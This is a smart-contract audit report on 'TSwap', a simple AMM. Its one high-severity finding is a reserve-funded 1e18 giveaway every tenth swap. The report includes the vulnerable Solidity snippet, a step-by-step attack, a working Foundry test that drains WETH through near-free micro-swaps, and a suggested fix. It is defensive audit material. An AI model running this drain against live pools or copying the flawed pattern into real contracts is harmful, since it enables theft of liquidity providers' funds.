# 5 t swap audit - Findings Report
## Commit hash: 55d1e086ed0917fd055b14f63099c2342eb6b86a

## Protocol Overview 

**TSwap** is a lightweight Automated Market Maker (AMM) similar to Uniswap v1.

1. **Pool creation**  
• The `PoolFactory` contract holds the canonical WETH address and can spawn a new `TSwapPool` for any ERC-20 token that doesn’t yet have one. The factory records both token→pool and pool→token mappings for easy lookup.

2. **Pool mechanics**  
• Every `TSwapPool` manages two reserves: the chosen ERC-20 and WETH.  
• Liquidity providers deposit both assets proportionally via `deposit`, receiving ERC20 LP tokens (the pool itself is an ERC20) that represent their share.  
• Withdrawals burn LP tokens and return the underlying assets.  
• Swaps are executed with `swapExactInput` or `swapExactOutput`, using the constant-product invariant x*y=k and charging a 0.3 % fee (applied as a 997/1000 multiplier) that stays in the pool, enriching LPs.

3. **Deployment**  
A Foundry script (`DeployTSwap.t.sol`) deploys the factory. On mainnet it wires in canonical WETH; on local tests it can deploy a mock WETH token.

With ~370 SLOC and no admin keys, TSwap offers a simple, permissionless way to trade or provide liquidity between any ERC-20 and ETH.
## High Risk Findings
[H-1]. Accounting Invariant Violation issue in TSwapPool::_swap


### Number of Findings
- C: 0
- H: 1
- M: 0
- L: 0
- I: 0



# High Risk Findings

## [H-1]. Accounting Invariant Violation issue in TSwapPool::_swap

## Description
Every 10th swap, the pool gifts 1e18 of the output token to the caller directly out of reserves before collecting the input. This is an unconditional, protocol-funded reward that can be farmed with near-zero-cost micro-swaps to drain reserves. The giveaway is implemented inside _swap, executed before taking the input tokens from the caller. An attacker can perform 9 minimal swaps, then on the 10th swap set outputToken to WETH to receive an extra 1e18 WETH from the pool, repeatable until the pool is drained. Additionally, using swapExactOutput with a tiny outputAmount often results in inputAmount rounding down to 0, enabling costless increments of swap_count to reach the reward.

Vulnerable snippet: 5-t-swap-audit/src/TSwapPool.sol#L240-L264

function _swap(
    IERC20 inputToken,
    uint256 inputAmount,
    IERC20 outputToken,
    uint256 outputAmount
) private {
    if (
        _isUnknown(inputToken) ||
        _isUnknown(outputToken) ||
        inputToken == outputToken
    ) {
        revert TSwapPool__InvalidToken();
    }

    swap_count++;
    if (swap_count >= SWAP_COUNT_MAX) {
        swap_count = 0;
        outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000); // 1e18 giveaway from pool reserves
    }
    emit Swap(msg.sender, inputToken, inputAmount, outputToken, outputAmount);

    inputToken.safeTransferFrom(msg.sender, address(this), inputAmount);
    outputToken.safeTransfer(msg.sender, outputAmount);
}


## Impact
Attackers can repeatedly earn 1e18 of the pool’s output token every 10 swaps by executing a series of tiny swaps. Because the reward is paid from pool reserves, this enables direct, permissionless draining of WETH or the paired token with negligible cost. Repeating cycles will deplete reserves and destroy LP value.

## Proof of Concept
1) Attacker funds a pool with initial liquidity or targets an existing pool with sufficient WETH reserves.
2) Attacker performs 9 swaps with minimal output (e.g., outputAmount = 1 wei) using swapExactOutput(i_poolToken, i_wethToken, 1, deadline). The computed inputAmount often rounds to 0, costing nothing.
3) On the 10th swap, with outputToken set to WETH, the contract resets swap_count and transfers 1e18 WETH to the attacker before any input is collected.
4) Repeat steps 2-3 to farm 1e18 WETH per 10 swaps until the pool is drained. The same applies if outputToken is the paired token: the attacker can drain that side of the reserve.

## Proof of Code
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import "src/TSwapPool.sol";

contract RewardDrainTest is Test {
    ERC20Mock public weth;
    ERC20Mock public poolToken;
    TSwapPool public pool;

    address public lp = address(0xBEEF);
    address public attacker = address(0xBADD);

    function setUp() public {
        // Deploy mock tokens (18 decimals by default)
        weth = new ERC20Mock("Wrapped Ether", "WETH", address(this), 0);
        poolToken = new ERC20Mock("Pool Token", "POOL", address(this), 0);

        // Mint balances to LP and attacker
        weth.mint(lp, 200 ether);
        poolToken.mint(lp, 200 ether);
        // Attacker doesn't need balances due to rounding-to-zero input exploit
        poolToken.mint(attacker, 0);
        weth.mint(attacker, 0);

        // Deploy pool
        pool = new TSwapPool(address(poolToken), address(weth), "LP", "LP");

        // LP approves and provides initial liquidity: 100 WETH + 100 POOL
        vm.startPrank(lp);
        weth.approve(address(pool), type(uint256).max);
        poolToken.approve(address(pool), type(uint256).max);
        // deposit(wethToDeposit, minLPTokens, maxPoolTokensToDeposit, deadline) -- deadline ignored in deposit
        pool.deposit(100 ether, 0, 100 ether, type(uint64).max);
        vm.stopPrank();

        // Sanity: pool has reserves
        assertEq(weth.balanceOf(address(pool)), 100 ether);
        assertEq(poolToken.balanceOf(address(pool)), 100 ether);
    }

    function test_DrainWethRewardEvery10Swaps() public {
        // Attacker approves (not strictly needed when inputAmount rounds to 0, but harmless)
        vm.startPrank(attacker);
        poolToken.approve(address(pool), type(uint256).max);

        uint256 wethBefore = weth.balanceOf(attacker);
        uint256 poolWethBefore = weth.balanceOf(address(pool));

        // Perform 9 tiny exact-output swaps to increment swap_count
        for (uint256 i = 0; i < 9; i++) {
            // Ask for 1 wei WETH out; inputAmount will often round to 0 due to formula
            pool.swapExactOutput(IERC20(poolToken), IERC20(weth), 1, uint64(block.timestamp + 1000));
        }

        // 10th swap triggers the 1e18 WETH reward from pool reserves
        pool.swapExactOutput(IERC20(poolToken), IERC20(weth), 1, uint64(block.timestamp + 1000));
        vm.stopPrank();

        uint256 wethAfter = weth.balanceOf(attacker);
        uint256 poolWethAfter = weth.balanceOf(address(pool));

        // Attacker gained at least ~1e18 WETH (plus ~10 wei), with negligible or zero input cost
        assertGe(wethAfter - wethBefore, 1 ether);
        // Pool reserves dropped by at least ~1e18 WETH
        assertGe((poolWethBefore - poolWethAfter), 1 ether);
    }
}


## Suggested Mitigation
Do not fund trading incentives directly from AMM reserves. Options:
- Remove the giveaway entirely.
- If a reward is desired, pay it from a separate, pre-funded rewards vault; never from x/y reserves.
- Disburse rewards via a separate claim mechanism that does not alter pool reserves.
- As an additional safety, move the reward transfer (if kept) after inputToken.safeTransferFrom and ensure the reward is capped and accounted for outside the x*y=k invariant.

Example fix (remove reserve-funded reward):

function _swap(
    IERC20 inputToken,
    uint256 inputAmount,
    IERC20 outputToken,
    uint256 outputAmount
) private {
    if (_isUnknown(inputToken) || _isUnknown(outputToken) || inputToken == outputToken) {
        revert TSwapPool__InvalidToken();
    }

    // swap_count++;
    // if (swap_count >= SWAP_COUNT_MAX) {
    //     swap_count = 0;
    //     // Removed: no longer transfer reward from pool reserves
    // }

    emit Swap(msg.sender, inputToken, inputAmount, outputToken, outputAmount);

    inputToken.safeTransferFrom(msg.sender, address(this), inputAmount);
    outputToken.safeTransfer(msg.sender, outputAmount);
}




